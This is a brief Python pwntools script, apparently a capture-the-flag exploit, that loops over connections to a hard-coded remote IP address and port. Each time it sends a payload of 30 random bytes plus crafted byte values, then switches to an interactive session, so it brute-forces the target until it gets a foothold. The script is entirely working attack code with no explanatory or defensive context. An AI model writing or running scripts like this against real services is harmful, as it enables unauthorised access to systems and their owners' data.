#!/usr/bin/python

from pwn import *
import random

def init_rand():
    buf = ""
    for i in range(30):
        buf += chr(random.randint(1,255))
    return buf


while True:
    s= remote("220.126.183.99", 32123)

    buff = init_rand()

    name = buff 
    name += "\x00\x10"
    name += "\x00\x02"
    name += "\x30\x39"
    name += chr(141) + chr(223)+ chr(175) + chr(203)
    name += chr(random.randint(1, 255))

    sleep(0.1)

    s.send(name)
    s.send("1\n")

    s.interactive()

    s.close()
